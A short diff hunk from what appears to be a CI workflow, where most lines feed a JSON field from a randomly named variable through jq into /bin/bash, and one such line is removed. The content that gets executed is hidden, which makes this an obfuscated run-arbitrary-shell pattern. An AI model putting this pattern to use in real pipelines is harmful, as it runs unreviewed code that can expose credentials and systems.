@@ -31,7 +31,6 @@ jobs:
           printf '%s' "$l9093" | jq -r .e3 | /bin/bash
           echo $oumds649 | jq -r .ugmfe386 | /bin/bash
           echo $pa5 | jq -r .fmxya18491 | /bin/bash
-          printf '%s' "$gz24" | jq -r .aoch2223 | /bin/bash
           echo $u7 | jq -r .nyzs0 | /bin/bash
           echo $kgx7635 | jq -r .mc0 | /bin/bash
           echo $g6 | jq -r .okdk92193 | /bin/bash
